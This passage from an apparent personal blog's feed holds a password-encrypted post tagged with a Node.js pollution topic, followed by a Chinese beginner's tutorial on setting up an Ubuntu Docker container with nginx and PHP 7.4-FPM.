b1b63bbef18dab3554c79d895de17a9782bedaf0eff91cca19725982ae81acb83f032ff6b8e7059c88af072e8ce490a51c73fdf70f6726fea10a3a9f00a9fb2e74b2d0f0f4a711b5fa7e2c739e0c81cabab100d1e50d5dd5d6de1a3491a4205937e9da61cce31492a176c1eee732e5b51b6a0d8fcb5d623b5762d8a8f33ccb56f913d90e3492dcc97c0867e862f628665478d2d3e8cd55a54c97318502b25d6305b84a6dc5ffd73f9fc5324f71ef460be70281c29646a4b2ebef87019b55bde2c347a11f602ad7059adae3f608c2e3d63784c17e26cfd1928790805d4cea0906939136b74781954cc76901af3e81bcc153727981521297390adf4018a57282e45df4771f7cc0d0fda635947d823a7bc6c617d5a8fde6cd5a9af8c97741dfb81bf05aa0899e47341f16f2528772aa264c038fefc31eceb20c817137277a7f3fb079c8c6b5321e9155bdf8828b112237432d423c370d86bd7584c24b036116e9c7960d6f609ab0c794bc0aa4ba4a9d5514cfc944b7601c598f44029139ba438a8e007ff2683a6eedefeacbecdf912898996aa50d885f068ebbc5ce72d73c57b246d38468696bec87ee47584e938a135f5f8cc6d868e120a13fad72798237cbe24066b5c23f0acf9a575dfac1992b300f93cdc4b4116f3be2ef3cb1a512fb5408f8f636fb7d33b6f69cea330ccc3a67e8aae531e568eca730c3a9deccb5f3c281c9404cbb31424977d1db6fc0e6310a06e5c1f99b34df14be3bd4260122550baef1f32e2a8c713c3d6a1756b89e9202a5c79333c628216ea5284944f2498164b0c67e1c796ab278e4c3e7d2a93c29da66275999adf35f34594bda41ec5f61c5cb37696e6e3c22c6cdb5f8cce7fabc8c5c4a79c2f8bd3d88a97da1e5f56232a56fd69085db89ff7f49a9998e26edef5b5c994f6442ad7117d95a0e65c90dd23e7713f7304d3f7818c41931e9aa1d0d56a4050d13cfa5f43f0f6c09c36cfd07de9ee81d88214d9b94ee5932c29f8d75aa3df11f1d3e898059626613ea315ce9aeaf3c232bfb67545bc5687fe6c0d303feb76cf30e72f1d9c5801358d6c018bccbf38f8366b01c878364285e90c1efbcc7504e5481f17251e87be170fc2545a9bd1717fd05a13bb299f2ff6509ced7730c13d25f2cce0d762695bb4de88523286c5810165bda7eac8371cda82e1aca1e2b44b358f80f8d2c8e6843766dd61be9564f2d760b2764af44e6a57d323ae77ebddfad198488c9fed34469b3197b1053dcd7fd36d910f6caf974392d5f8fe063b2e835539453605ea9908ab19f9dad43f70041638fe49413c9c19209dfceee4952dca853511b5e068dc92370fcd62d7780cc5f3303b1c5ef9f6a0bf70f48d45340772d130faad969b225e80b4a3a1dfe22d26cf69c02cb76d8b8d4f5e2365d5dd89b05fc476c287ded3dff970fb7bf7e3b9f1372bce8a39b9fc208add745c6daad9eeda656f7f1946574f7bec36e9c622226f66b489417a1419ec42252f587704b689a802b72c1fa98b863aa8b9bc682b13397a40271cd9d8852462bdec15b71b71fdb224d1d3738eb15ba12c2ce54a7d1f0c431995078d715470092a3b6e17ef4f24466511d88712c7e13c694c46f6b6215def795c470422ee279bb6b499adf320498689147808bcab385b2e1b142aa7e5bd46cab1beb8fde20398b36318923d6d12f56ff3390559dee98495fdca83a51440da2362fc9632e32be5124027e30a3ce1c52756f5814249f1a7f7f0ac27df4e3713bfed4912f25a44b18971521266d06789b66b5582c124a3386485b2312d192dfc4919926a5c17b52c18204eea956157e745cc0373379b7a0f8539be36d80c78340be932c8469096a56a2544c4b061f812cc65f0b2185c53e0eda39c8588092314a62e746d8ec0925bba4ee9808a90a155cac21229b2c4eb453e124d29f58e60ec9d6edb568928d251194e52ff351f8a7ffb8442917709e66f03ff86993140c95c1c611eac121c4f3617c08948ed23084bc66e4bb084d1b8da8dc48c88a29330aa04363e98b95e44968d408dd40b6cc387dc4ba783717cc35ee6ea40dea44fc44e790c8f171434b4f0f3220c15b1b0d074fb97f52c9c89d535cc234a2c845f17328f1243896c80cbbdbb1ba079b73d85c0a0788eebc65a9ba47562952749fb6b2f0b36e8c51b4c9886d14cf5108da2a47db7bfb0155a5779ea16403dfc2284c95d53d296e17a6030102451bd5f8cc095d8f7df5aba2959770bfa181200b04475369f0b9e72a52f3ee36dbfa81b0fc02f73d14b8846e1ca5cab98afcd6b28108e49146f1b0fb85cd97f27e322b949296396b6f638fa78463251ac5992e8a5b3e967c368d1744dc93c3146cf02ebdb773c198e7df915d23ad2e8b8c86fc3c0ab319c1b756702a6be61da435e06d55aa3488a93e476f4b18f19d4f31a755d938e954592c6f1ed7a3323b2f642d7c77f9b7664efc930b2b749b18cfe3383379c8a2e913418d3987c95050b1e82ae4ccfbe93871cc73ff31b2b41884fabb75ecabc85c2e5e98b8624d45a0e7bf00e3528f5d0f9dc9e904028ca3e05fff49ee9e705248fb9ca541fef1396c51b307db0a4016f86312422c86b41039c57419095049a4fa033fbbfc688a6ba1abd5d80e607000625754db5b6c1decaa2db28fe22cb8972a8472094857ac19c4e22d2aee111024fa85d0e06251aff419469c0252bb554543f4351dbafeda7ef7b7b563dac93ca19d28637579c903ceed2445eaa41cec6e9731a2dfb3f5bf4e5ec76d924354fbc72729399afbdd019636b43a2ec6178bf5956b8fc4993161bd47eb10df6e0054c5aa964cc7e68623c65daead605aee811dcc2c04fc86642ab51ef1b179d8a5e2f8e56b90ed3fc272803fd35fe2c88fec77d21767ac7f708ccc6db1996df6fc496517171536dc573d1d4d7823c17b81fe2e82dfb5c3d5d4f7e41d55ee5055e685016cd84744ed5367304564e8ad21ea7c922934a1fde14cdf63ff088d279270a78a845212e46a8fd2885754831ee9db62ca718d0a01b0a0b24efbdadfb1301aca63b2f3726fd096794e665b1965db6c224c25f3ec2c6948a0dec9c88914a948d2dd889e10a3fbd8ad1e18b930e3a747d68325d06a182ce26ad19b3769d9faa2f8a0acdc968c5f7c1a6555ea10e81b219d3aa01b66fc0a31b5e8a60972df75028d60ca8542451299b471a1bc3cc58184f8a3f75e6fcf28fff915594f0d2463fa3271dbf3e8ff30fb28c925c79d28c8e451cba391d339e4a17b9d89e673db18b860d05889a65331bce5022f6b7cab8cc0981c4f76c74a2d7263ceece817db251c840bb24c44d84ad914c99ecea2bc03c573e732347e8e5bd9ea22bb4b434aa5a5ba7703a66aef7d13b4693831c3ae10843df795631afb4ec91896142e5a35f518d8f4e47f2f7068b61a5fe99bba22130213396b3fba999737396ce93f90c2a7c8fd1079c2756f6cbf36bccfa4903d5a1dd5dc207af6d900554bbd7b59a2858585e626a5a770b511466304973cdb9f1deddd3b45277354a89975de92a75f6e1ef8d41c606b8d05331c128a3ee61ed15743c5c9df0a52bf90a1b561925185bcc46464d2246012a4ebf09ea7cee00fc4dbd6b3d56a12a2326d01befe7dc2820564d3d3e509bcd8dabedd68f56e931839882e148aafc377c4579ade32f78267f6f35ace821abe6fb31dbbcf1203bc399a6caf685b50d89939acb70261d353d465c70e04012b792d1ef1e10331c5352e97679b74c38d88fec03ebe560f2dbc1c19106108b11b92bdad3cf6ac3fabe6493bbcaca73d24ea5d4d6d15d56fb04a1124152c824fbe87dfacca131eea2c263782fbef31d3f83eb1b4537ffc8712975810f5a8814639faa1d3b47b37080671e2ea19df16b670a46d494670aa03aa5973c65473ec6f8fe99a4f55a429978f1a88a2db72b018c937d541f695b4fa89f8abe1ba7c17889c172546ef219681d72f92ed14174c5ee8f0b23a66d0ebb95e28a606c2ae80c9b766e93edc5c939046729b3ceb1904969002462d733cef04fe19818775460fa9834e3b4f5ab48407b7a7bcc9af7a8676f83c438631f866d4e8d703d6bf678008c1fc84459b7dbb8a744f3dda62a14de64189f7b2e47d17ae1e4b121ecdb0e7d50227cccea1d85881f3710e1d4b1593e65c5eca5c2ea74655264a66d6f1b0d1d247e7e13974ef924d94db398f7c79bcda0c8cf4b0d30d75f5a759e02cf7b7622913c7aa02acbbcec3056eff28644ce4e1adad318bc3a497bdc28e9c3f28c0ab6834da7f5aea238c4830db302255e721b8a458ee6bcf970b1e7972f420ce60115a95ae7b00e6086ddd79c0e46d65b35994b0b2a59957ac82ab517210321e8115a3e6cf5487fe5561d8e3d4b687313aed302de8431dbc3a63cb7d223aa9014af79c4404e46f6474af9110d454a99afb47c276befc96d9f6f21bf3915037c8f79772c45a2dd005eee0ff8324a20dd4524e96c2ba0bc4c3769986f51d7c85a255189436c00fbb2aaa586008788cf23ccde5a9c53eed2dff2adc1fbf6bd9c398d15ce9098373a2f6b00d90be000373642f04d15986e2592f4fff9c2bc07187536c5790310508210b83dbfd0aa1d5adfeb426c56d8875d3d67d58d051bc85d781ae12555492ede7bbeab7108b9f7e8d7eb2615081b46d0aa33746eef572ab742cc44889237efdd3aac95b3d330fcd291e0847ac9b508fcbf22872d249d5fdb8d05d2aaf518663c7c763db73284f99570de5b80bd478bd33343fcb12416c48b2989aa11026a35c235216e5c06a55c9d6009e732eac31fea37a02b2a80e509405694a3f08cb2ce3c0b6078f2ebbfa0534d540f6224a7a94d2b2b01dfd7daaaeea27ffd06abfffb142229bab4de4a451e9092167af3a67520735c2c86927adc354f4842405a651a38c7a9562ee546a33467d112f536701b2ac0b5f77e8aed4761d6564243144d45dcc9517b05d3679fdc6886c05ad24ff901ac30b7dd7ce27eb747dd460d1720aee79ea637a24de6b7c80f4f619e12fb9b66ed48879b905ad8d1b521844bb99d534c4168e94b217df1c14896102b71cdaf4eccc85c81f45209330cfcb57359a23b60559ce8fae572788f61d992e40093ac1e02e5da160f903e9bc6313904939cd1a5780185eb3eabdaf45ddf135cf4831aea1c1081054ad6787c11c26d1a6d60d0da943f7451b9057c94fcdc4cb8e24d850f683b471c7c6785a9eb00da783d5e1bf6bb78f2f0b3bec4b544b6befbc03eca9204ad787cc8d74d2d22a01910b368b430db3337da40aff77349b7334775f46916bb71ca4b781c86ce6374b57ccd9495886622666f4f9bbd4bfca53d879069eac2e6680fe88a095ebcf87b8de67061984194512f6fe49d6514bdda1ce3a8707b6af3ad858cd7a99db255a95ae4027dc3ec953c48898770d800f41bf4ec5082b6b062ce1f8d9d435fb30d9265c989f441e1d3ff413088cd093d3cfc605892214b6a07419c286ea8a0d283a9891e7a87a46dec74bab850cd5c9a03007367e6a601c956a47e071743e86696af984ac0002566f192c4e6af1dde6e5b89f141ebf793764fd3c2f4001f92aabfe62decd4bc2cb5be537f2dc7966d0953592862c61e9245fa876ca58f1b8afa13856defdf26443ecace9642c1e8fa5739614c8f3972d38250bfd5155c7b0ebfaa9afe0ecc73cdee11486417a5fcdecfc8bd79eba6e1f3843e889d1c237169c0e97226bb21f94dd04eab7b8f635e6cc4e735db61725a5c1408f8c8ef94f5fe3ffb71d572eb23d6bfcbed693bee2ab261a8aff281435f855d7d8c693a8f45f54dba019e6c3be1bfaf45cbe5505937299436857019abd05713557730181a5c4d170b7cd66d183048e768cdc0ae3b3f5897f004444b5c75e765d9781bf1233b909f04b86deeddc563d6dd8d39c6c3c9150ec79b724cfc7374f53b1720fd516297c2729b86b07cc5071fcab1e8907486fc43be6609b1044572b14fd49435ad1b059a811c417bfd42f7a02f8423ae3fe5508a3103b0c81a5c2ba3ee5d228a4b333f48344de931bb2eb88ed186ff86ecb6be7f7e90596e5d9db38659508a4629467d3ebe40e7759ec3b654a25f6792e1818bc43732252d4b10d6d254c31e1513184d2be7871a2a916250f7ef74eef5a6e04606163904b89c9d0382aaaf3c5c4742b74cbd2546e2b90e0847d8e87f2ee317ac23b65f610327ecb52c21cccaefea54a8fea292eaedfbca6306f6b982c5c0cc018e502c72f79bd65c31294857a57ea1a302f9de5c47296d69b6d2967b3e0e244867bde02858d94117fa798e17f185fc9583c193ffa352a0bda9bca62f2bc201fef635119a220ad2b0c2d94d23860e5119d5f8f89919ff1428e4bd774040419e560f71e41d90f3490e20c50ebc51ddada9b32a342c4802df92576c74dd5d0eeefa6303fc419be0656984839c5e361c2654e770d7bf0773f225bef6ec4a35d73806cd8d126cadfab6c411fd12a5311d0a02f950858cd3c5effa1df6b22bb6533253ef5276e11843779e59c881c174422193183804d2793de2baf6670c76271c198f4c8f0822cef34a1200c6a78255f725c9e48d66dde26b1e6191d84a279bc7eea5f471c09c5a714cae6d4198fa147b786e6630f25bbde83ce46af9bf375f84b1f18feec4cc74107e5f8642ef516df15f5a0255148e044163ad81101371d2b9aff6a9b8413355e6b7ac68547b0dba72913e32dafaa0d8fc707bce3cb23d04dbe8b9a63a5908bba093132c0a0af037f231abefddd9683ab732fd19432f37a7b03d98f7edac45fe5864bb607312c19b02d8a7e96e5b943cc2ece76247de1b8770bb23082249742b2c048583a3c25beb43f1c63b377972da7f4861d2518895e33e6d1789febab2a052d41e4648b802a1c0323c7798196ba1f5b95b21e02b902ba1d2d964b6012821aa51c10714b47daf32f1c246f0fc7bc4076ff961afcf5849dbf7e8298ce5715e1504420843d08dbd1e11efc31b63842181e89d7d687a5dd9fb51dbb3a363534391bea98203c925b354ffded6b7d48e956fb5832f941f58006564dd604c4b9f1c4cfcb2b2254a70d03e24ee3c1ad0504217f4c4689df1be81b3c0219419d75c96f7e9155afad5c9f69de29e7ed5ac6ba26d10ae9b8bb65df4ad136d2966895d443776431f1c7869f2133eb4354a7da0593ee607b6b47e5e683fc82c74de54f923e41ac960f0f7e3a66943f8c20d5e9905b4d811291cc2fcacc5aefbf7ce2c04d5bd8342f0fa98dc55cf4a1a883702726cf9c1ed6d58e3d78673b06caae6c12ccb0ae3a09e8392f4c727ea05773e6b7148f572b089a01a9f23bc96a78aaec7559d6fbc7176ab162637dec74cbaa23a36feda9f332ca4b5b1146d95baa5fbf141256038bb4a7d3f7cc5f76f9aa311121946cebb0b81fa4055b8e93b5579c5d3db57ded6a7755eccf011cae7bfae60e60097b67bdb74a4a44bf7d87ef570201e445ea50faa0b5d7609b3ab94ecc7905ae509eab04f8cfbf7f5e2f49f0ef5c9626454f98113ac0284e1000fe7944745a8c11712e41898c118065998a316eeda18fe294cd5a3a1910683330737ee02e49abbd4cd7de9ed46c1e1c4fca4d353d57066c28b9f9f25fd9401cfc91b890aa2f873076254ee063f649009ab617a3676371dab3a6e52ef10e6014902981635c5ea0f216204e8c2d71bfe548488f4c9bf84244a202c426b2972fcbdb602536a1215bce4150c91d5cb0c0d29826bf5be2bd850110b0e50a8c4a358ff88461359c978a62164742c6528b051b9b0a518ee127d3d60873efce94c90bab960fc2cc7c46c54248be0dcee16b438bac0b8c77076770256d94d6bc4643b8ebb7d510ac0486798280e01c918b71b28582c9deea08c791015aed23cf2aabc8fa9c962bc7d5e670d4339c45c804bd132abfce8a3f25de72e311ea2af40fe1c9dab548036470dc8a5624b482edf8e6dd7914061ef26899ba5119325fce53ce438d4a5c7efd56f56c43138ee490179e33de520258cd12ee2b8aa957a299eddd385da12b160a67222f4b74d77695d0a68d9ea5f16de450cab827c47aadcc60f654b777f2fe7ca6046908e4b285b07a2d86cb13d32b6aa1c42caacb269da53d2cb3dc46ac9c159c187e667b95572c5ae0a4405c8f6ec76324f1104ec6f569128317408b126079ce1c3a61a0a8b7da7620ce10e5381a7b6d3919d5ea6f1f86405be3bcfbe566a996349833dc954369c6e5f895d99f5063d59554ba3f7ed5c5644df311c73e863b372fcc53a85ca11c3c0967862adec8ef3d6c885e9789853d859f67ecd4f88f73e79c8c6dc860ca5f5a8ed97614b892dcda422877d676eecbb9a9be1322b832ca9f41d6bf017b2f5964d7cc952720f19e27aa8075878b5a7b024824db745245297cb2cd740fa782c446dd439399ab3bfa2768a860cab93d0d91a16c54b4566a3e68c4ad0f0722d16ef5851b0c623f38791174541e52125ac32607161ff97f0f065267f717604262480afde311c61c2497160f91cdf9c4f4d5a62dc7aa41e8e40bdd33d8ae1c22628002dd47a66264596b5ef63e55ef7e1559800cb90f5c038d71b1e7ac38ae6e20cdeecbfecab888238c0e9d2b110bce461e0bf172081a1c2c6e66f35d16688f785bd6bf54b7f8bdfcc74cd8af8a05d0b9453cb97e9f1f2ea61c987d25c53e3d9d158f6a56f3b4ad6f95589ce13198eb168d1c639d054cce82fe3aa1cc833bb4ae15a2739f9b87490c5f5edad46999606c1006f62a0d16c99bbe1ee31092653fce2d0d88b5564d087b68122a33811edfa2f1f2026c43baa5dee2e48efed529f6db8790249794fc0fdcf6d41b6420b9e817c1d46fbab1af5e326108993a24cce57f2bf95e2d6a305278da124527a372d70ad4a366c4bfe3e527370ba97d1fb09a6d2ebb4f93a16378c02215a1c3d82b32d19dba7642b0be8b98dc38ab38a34a115378d7684e0c0ef237c917bba4b7441c11078589d6133f33a329e647bbff0d0f5d1c9a336fcd5a5c7b4cc2f508263918748a88c0137ee40cd46d6fe31eaa8f4667c9aa428b06e599e3bf2a24dc0c43fcb2396e8f1de5c4f8a1134c91e0ac72ca8ce8a1af87a20cb8e170941482e083533524ef59b26aac1086429f65cf44d9c0475d084364ffb2e02f1522767cda0f65565f1ee19f39822487e2f938dbff98b389433ba43ac7979dfd4cbf3ac29125af42bd666f5d84d87445cdd7bc324b6cea965864664109c2b108330edd58ee0ef4524d5b1167fc2c4eede43428a819b2788adae8549090d64dfa9577f71b9c86b5496575e8493d7f370d44aa3e27c4e47cf621f40b45f05aca61cd5c7335277b19f2d1b83a573661a7ff6d2e292cab6ed6dd8b03db2ef5ad0e3d7bfc0467129018d5c8ca5e7b95f8b3a0d97667140e328ffd14a03aa01fbccd230dcbef20863a477dbf40d104672976e34d667599c39099f733b82c9b3189f379b2500cb5396581f415a76c42535dfffb440ddd37cc1e6e303e439d4fe65a3044fddea4a850fa29decada88f64b1189b1d109fd052382ca67e7260c4eb7f968ef672abe440d5b71d6daabe304acf5723673adc4037937727a4c6e3e0624204ffdc98b01ea9f9bdcab57b090839194dbb01b2ff05496cb2cb4077884aaad234e6b1c91490812cdb501c121cb223cbd3cc94c7ee9718d6e13195ea63eee6b84187bb32a7b2cc985c06e1867017c305df815a7391e273fbaa674a793d23a27147bb671c801d634f1758d63c7e88009f5a467e2775ec725063902f1441cefd5a7d29b4c2da345675a69c2a5546b2e87b022581eefa490e3267fc82bc41b8cfc019687354183f6b3dac905b4037b7517bfec6beb900e6668e1643c70a2d7547ffb42f841d421cba88d52b9d4fa5fbeaa72076ef6fe912ca5a01884330f264c1c000de635d3364abe42b1cf744f81c182784d9c7897dcbe53e15723c6a488317d231478fd770cfbede7fb67fb14f7b4bcf7e2cb8bceb14f0a7e1a40b4bf1645fa2088983b05d61776c67e9cbd709bf4dc3bbdde6abe135257eec282172c92e9aaebf929c073e4b7964bdc7ee7bfeeb434011d8ca097dd8978ded783bc3bca6e68a354e4028dc4c0ab63b3b3cd9c86733acdcaf2812011d5bc2a3ad03a3ce00f7469758d2da512549518f0f881dfa3e5ad64b3dbe3912d83c9c1cd034137a0ea3f7893268c8f4b2bb1aab093d963d9ded29bea739419526cda64198a9cd0d19e1f17ac9cd53925348b2bfa14d522537e09fb753b5c13d1fb98d69eecc6e2a191efd95faee8a5e81a52617e17977a3e77d2c812d19855a1095b2f7addfba2323b723715b7f0e7ac1823dfe38938cb0db94719e00891c48e0668943701cb25e905c7de311716e8ec51484628b8573f2c99d7c2bdf20c431754851fb1a515364cca2aaaeae8e43256d77ba85fcfd3d98cea3299fc50204a9cf3371a367d962a573e94fa416e19efc92d841f69fed7a3c4ccafd04016e43f356df1dcfa5ca1a08964e57dfe7d79018d07cdb97f7d730fa8839dedd193f3ca319581ed3ef436ed0d231a2785a84f8ef07708a27418af618c882e241ba6a89018f0671d0571354a65fd430ba1004fceeff07dd09bc6483de2bed38c3fc1ceace44ca0b7a704b54c9755a2b3e6bf7bd42cb7142bb78bbfd72d8f828ad586862c1af8f3c5e163bf3c05d507f8e1d9e8ca6f684f1cc3f0df25e46ce1992c5d0d5956f2079999aa25ee26c8d7553ffa2c03d5157f507587bd5a576cb562c75bd4b4d7fa5ef744e26fc12bcba05739b59ea7d275748533116e6ae9c5147bf6d3dac59287998000601cb07ba09ece57f26a4f341098c3dff0359144c5e2e678a79de6dd3f36a8a898e48e20c097abae3eb6faff4badc76381696ab292e48f24f6f75a873bf6c57db8f1f1a21e15cc245ccbeb61462964e538bf7ae9196bfb54326ac425a7ebb5343d9b5fdee4e8215ec0deb9bb82a980db6378c8b72150ec051785b546549aac0fe325edd1f8719fb0a2d194bec61e61aadccb974227ff20602ef1a324268f9f5ffc5caae99222bc29c928040c00684900cec782031d2f4d014908d087245cf8fbbefa556a56b07bcafe3f30f08341b3b083ba1a978c90367e29cc94ddbc0aac4a20f7445e3bae01dc2a4e98c6774db2f368630a2e4b1b0c9d53453f32f5b45ce85705a949a175eab0fa9ac50bb2551032a82777be9b72daa06112cd79ca5db2d403771a2b48d06aa0d5e6fcd35c2f95d7c0290bce8571c3e641a02f1ea90e26502dbccf546dc41a9ebf03000ded34862ca681d1e21d0d05b94a02980f0ecd602e2ae752956fd1d91877896965f00da0b389e55eb6e56001ab4d97295efbf895af163e944497da9c54478658e2669358172ba183356f9719c1a6699515d7289befc0fd5876fa553451d4fd0af9640cac1a9e9b93add73762f20a5d2ecef5fd5710a1eb2fb928f0ecf08cf03e5196595212277c9fb8a28d187127034d67da4caeea7d96474eb6102d2a5aa260aa5a67443c90410b60d5f5656db3b295d7a6c3d2729d0dfc55aa554a44a874667e3e60817ae031d19ff8a19375ea110e6691e36351fabd66b610f15bff789879d3f4d29ca08dcdcf69730b2c8f6db3786247e1b6d73591d5d3cbd2e57fb0c2da441cef4bcaf179e7318ea57fdbe254c60f986ca8ad469d389dfe9039e5a1ee2ee0e7757d7e207f69d02b505d308dcb792cc29e522e15e76dddc472b3cf02ab50159c06a484d4bf91a564c26ee1138132b5fd69d32c14519a6ac859ef90a21a05f615bd0e0ccd25012bfdc02d62a27b163e6111135184ac162c63fcae7a847c8a893e65706954b4bb774c7f208c588fb7d085fa8d9f9438bd7518df9ba417a8efcb945749d03e318ffec95d6d718548fb0bc56d3ac289d7e86a0b6500cc4ab2ebacc22ce0ace50a3454aa085846d64b22cf8a64391a50aee6e8c5ecba99d8c9c561d6096e1925f008680a8d3dfbd1227e27d18d2f397264ae0055f1c5c21f76296565c33366b560fedb9580a6a0c679c976b4b3cef320d78f0edfc38d70bfc00bb6486c76ea7af082ebaa8cd2eeeef906e9537eb8f2cb01d942821c8dc938360fae9a4816117c2807cf28bc78ca08eb0badf11ee30b00f8604614bf0f496c39c8c06eae3049169e925402a7b9dbe545910dd44a446b5c58fc0ef08f4a68d8e56f9021d849a693a8ff3de0ad432f15141dd7ebc1650508164aea8ad1150d44dd1b39f81cae186044d28b2282a8ed739e6f88b97cc8d3d6edfca2c609aedd2af6fdd497988f44529b454372bb1ae84a01477ae9e2d5db85e66e916a90850f3a58d07c7a33427f64876be26e13f41afc0b69a3747d0c2c7d98e2eccc25e45664b30a94a157d9c4d0a58e3143fd49d7ee1d9ea2c86bb23268f983ff21b5bd6620b785c9a579a62f09bf68ee38ec6b3641d44e8949b5f999d6179ca5e2517ae3c3baf3b9e9f2c4e6a93fb100d7333aed61a193cb345a940cfa7fc8b0c8403d87980fc387c1d59a4b072f94fae0376ee038b5ebd1a55e7aa964840de1c0621c2b1b3707c446b8f3c77d7a91e23885f06357660502aa0ad6679c293e124b00c16cd513648d1c67e01e543414d8abe72513706c35ea4fe60b269141485f5c600795fa18d1af3c2d24af1662a5d4bc8ba9cd7c1915491d7986f8f464292fa350ba0dfa0a64e2d3dea24f81e77b6a1ce336becaa5916db6676d202a0dffea0672cf06b6a44c4d1a98e237d3d85e4761cf193a2f89db8ba8b9e392ed947e6afce8a4501f9871c1c2dac4be466617b419e86b28bb3ebbd18290fd54abce74e9ae857ad647fc673a76a88c24e101c3d6337d8728a20cd94b2b09ea4950c2b49d9dc850996ef4fec1ea60fcc8c76be486cba46227b1f77b009bfcec809314bd9ad57aa6d578cf5a592c3e01162708d48e2a888c7fe39a5b83e75736c586fa9b8761c96db1e3b731d799f575dfab71de08edd7a1f9b654d56a290ff1b73aed3aa60088808552353803aa0c41a8de3b38fd69db6d13ae76a25b4d1c8b7a888513cd89e00d591ea24736f379e3e0b372145bfda8c31729f7e441bfba2803037b5b7f529cf419f78c66df11a11f8a7041de0aa93da8322839e4649f9abf0d32ea55a08a82f56ff8570613eb65dfc75f865a04cd3973e20ce4938083cb99919d589f2691bca41d7dfab1166bc5ab5c73edefaf9d0e1aa20102b5a531e883c23a7e0db547c1cc2c3c0ed973eb0475beb3d4c439b4622f58eb37b755d414ea7399b3d49333c82e9d693f2ba850e19da849a871f132937752e3fa1e98dc60d6a9958df3085f8ecaad682e868446a627f468eb9468930ed26b4cbd2730ea3c03ed266a5d2d3555b4cb</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-Nodejs污染" scheme="https://ke1nys.github.io/tags/show-Nodejs%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>Docker-学习</title>
    <link href="https://ke1nys.github.io/posts/75581288.html"/>
    <id>https://ke1nys.github.io/posts/75581288.html</id>
    <published>2023-07-31T03:16:07.000Z</published>
    <updated>2023-08-17T09:33:39.338Z</updated>
    
    <content type="html"><![CDATA[<p>这里写这个的话主要是为了记录这个<strong>学习<code>docker</code>的过程</strong></p><p><a href="https://blog.csdn.net/YBaog/article/details/125349766">参考文章1</a></p><p><a href="https://www.zeker.top/posts/f7e6aba0/#%E4%BA%94%E3%80%81Docker-compose">参考文章2</a></p><p><strong>docker安装方式自行google 很快就能安装好了</strong></p><p>(<strong>之前只是简单的了解了一下docker  没咋用过 现在开始学习后才发现docker的强大</strong>)</p><ul><li>ubuntu </li><li>nginx </li><li>php7.4-fpm</li></ul><p>以上就是要用到地东西</p><h3 id="拉取ubuntu镜像"><a href="#拉取ubuntu镜像" class="headerlink" title="拉取ubuntu镜像"></a>拉取ubuntu镜像</h3><p><code>docker pull ubuntu</code>    (不指定版本地话都是拉取最新的版本)</p><p>或者在Docker-desktop  里面搜索下载也是可以的</p><p><img src="../images/image-20230731141029597.png" alt="image-20230731141029597"></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -it -p 8080:80 --name=ctf ubuntu(镜像ID)</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit   //是退出</span><br></pre></td></tr></table></figure><p>启动一个已停止的容器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start b750bbbcfd88 (镜像ID)</span><br></pre></td></tr></table></figure><p>进入容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker attach b750bbbcfd88 (镜像ID)</span><br><span class="line">或者</span><br><span class="line">docker exec -it b750bbbcfd88 /bin/bash</span><br></pre></td></tr></table></figure><h3 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h3><p>这里的话直接是在<code>Ubuntu</code>里进行安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install -y nginx    //-y  是全部默认的意思</span><br></pre></td></tr></table></figure><p><strong><code>nginx</code>命令</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭</span></span><br><span class="line"><span class="attribute">service</span> nginx stop</span><br><span class="line"><span class="comment"># 开启</span></span><br><span class="line">service nginx start</span><br><span class="line"><span class="comment"># 状态</span></span><br><span class="line">service nginx status</span><br><span class="line"><span class="comment"># 重启</span></span><br><span class="line">service nginx restart</span><br></pre></td></tr></table></figure><h3 id="安装php"><a href="#安装php" class="headerlink" title="安装php"></a>安装php</h3><p>这里我选择的是<code>php7.4</code>版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y software-properties-common</span><br><span class="line"></span><br><span class="line">add-apt-repository ppa:ondrej/php</span><br><span class="line"># 出现暂停，按回车键[ENTER]</span><br><span class="line"></span><br><span class="line">apt-get update</span><br><span class="line"></span><br><span class="line">apt-get install -y php7.4-fpm</span><br><span class="line"># 必须得是按照顺序来</span><br></pre></td></tr></table></figure><p>php7.4-fpm-命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 关闭</span><br><span class="line">service php7.4-fpm stop</span><br><span class="line"># 开启</span><br><span class="line">service php7.4-fpm start</span><br><span class="line"># 状态</span><br><span class="line">service php7.4-fpm status</span><br><span class="line"># 重启</span><br><span class="line">service php7.4-fpm restart</span><br></pre></td></tr></table></figure><h3 id="安装Vim"><a href="#安装Vim" class="headerlink" title="安装Vim"></a>安装Vim</h3><figure class="highlight 